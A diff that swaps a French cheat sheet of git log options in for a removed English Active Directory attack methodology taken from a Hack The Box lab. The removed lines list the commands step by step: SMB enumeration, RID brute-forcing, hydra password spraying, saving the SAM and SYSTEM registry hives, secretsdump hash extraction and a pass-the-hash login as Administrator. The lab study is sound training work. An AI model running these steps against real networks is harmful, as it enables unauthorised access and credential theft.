@@ -1,96 +1,96 @@
-## Easy Box:
+## Maîtriser les logs Git : options et affichages avancés
 
-Here's an enhanced AD exploitation methodology with commands for each step:
+### Affichage de base des logs
+```sh
+git log
+```
 
----
+### Affichage condensé et personnalisé
+#### Voir un log plus compact avec une ligne par commit
+```sh
+git log --oneline
+```
 
-### Methodology for AD Enumeration and Exploitation
+#### Affichage avec graphe des branches
+```sh
+git log --oneline --graph --decorate --all
+```
 
-#### **1. Initial Reconnaissance and Scanning**
+#### Affichage personnalisé des commits
+```sh
+git log --pretty=format:"%h - %an, %ar : %s"
+```
+Explication des formats :
+- `%h` : Hash court du commit
+- `%an` : Auteur
+- `%ar` : Date relative (ex: "2 hours ago")
+- `%s` : Message du commit
 
-   - **Identify Open Ports**: Use `nmap` to scan common AD ports.
-     ```bash
-     nmap $target --top-ports=1000 -sV -v -sC -Pn > nmap.out
-     ```
+#### Utilisation de thèmes colorés pour les logs
+```sh
+git log --color --pretty=format:"%C(auto)%h%Creset - %C(blue)%an%Creset, %C(green)%ar%Creset : %s"
+```
 
-   - **Host Configuration**: Update `/etc/hosts` with the target hostname if needed.
-     ```bash
-     echo "$target cicada.htb" | sudo tee -a /etc/hosts
-     ```
+### Filtrage des logs
+#### Voir les commits d'un fichier spécifique
+```sh
+git log -- <fichier>
+```
 
-#### **2. SMB Enumeration and Credential Gathering**
+#### Filtrer par auteur
+```sh
+git log --author="Nom Auteur"
+```
 
-   - **Anonymous SMB Access**: Use `smbclient` to list available shares.
-     ```bash
-     smbclient -L //$target -N
-     ```
+#### Rechercher un mot-clé dans les messages de commit
+```sh
+git log --grep="mot-clé"
+```
 
-   - **User Enumeration with RID Brute-forcing**:
-     ```bash
-     nxc smb $target -u 'anonymous' -p '' --rid-brute 3000
-     ```
+#### Voir uniquement les commits modifiant un fichier spécifique
+```sh
+git log --name-only -- <fichier>
+```
 
-   - **SMB Information Gathering**:
-     ```bash
-     enum4linux-ng -A $target
-     ```
+### Limiter le nombre de commits affichés
+```sh
+git log -n 10  # Afficher les 10 derniers commits
+```
 
-#### **3. Password Discovery and Validation**
+### Voir les différences dans chaque commit
+```sh
+git log -p
+```
 
-   - **Testing Credentials**: Use tools like `hydra` or `crackmapexec` to test passwords.
-     ```bash
-     hydra -L usernames.txt -p $password smb://$target
-     ```
+### Afficher les fichiers modifiés dans chaque commit
+```sh
+git log --stat
+```
 
-   - **Access Restricted Shares with Discovered Credentials**:
-     ```bash
-     smbclient //$target/DEV -U 'username' -p 'password'
-     ```
+### Format graphique avancé
+#### Voir un graphe détaillé avec les branches et leurs relations
+```sh
+git log --oneline --graph --decorate --all
+```
 
-#### **4. Initial Foothold**
+#### Alias pratique pour un affichage lisible
+alias pour une meilleure visu :
+```sh
+git config --global alias.lg "log --color --graph --pretty=format:'%C(yellow)%h%Creset -%C(auto)%d%Creset %s %C(blue)(%cr) %C(green)<%an>%Creset' --abbrev-commit"
+```
+Puis :
+```sh
+git lg
+```
 
-   - **Remote Access**: Use `evil-winrm` to log in with valid credentials.
-     ```bash
-     evil-winrm -i $target -u 'username' -p 'password'
-     ```
+### Voir les commits entre deux branches
+```sh
+git log main..feature-branch
+```
 
-#### **5. Privilege Escalation**
-
-   - **Identify Special Privileges**:
-     ```bash
-     whoami /all
-     ```
-
-   - **Backup Privileges**: Use `reg` to save critical files to accessible locations.
-     ```bash
-     reg save hklm\sam c:\Temp\sam
-     reg save hklm\system c:\Temp\system
-     ```
-
-#### **6. Extract and Use Password Hashes**
-
-   - **Download SAM and SYSTEM Files**:
-     ```bash
-     download c:\Temp\sam
-     download c:\Temp\system
-     ```
-
-   - **Dump Password Hashes**:
-     ```bash
-	python3 secretsdump.py -sam sam -system system LOCAL > hashes.txt
-     ```
-
-   - **Root Access**: Use `evil-winrm` with Administrator hash.
-     ```bash
-	evil-winrm -i $target -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:hash'
-     ```
-
-This methodical approach covers enumeration, initial access, and privilege escalation for AD exploitation for an easy box. Took from Cicada machine.
-
-##### Reference: 
-
-1. [Medium Cicada machine Walkthrough](https://medium.com/@misterxcrypt/cicada-walkthrough-hackthebox-2bb9f961ea42)
-2. [Sickboy github AD Cheat sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
-
----
-
+### Trouver quel commit a introduit un bug (bisect)
+```sh
+git bisect start
+git bisect bad
+git bisect good <commit_hash>
+```
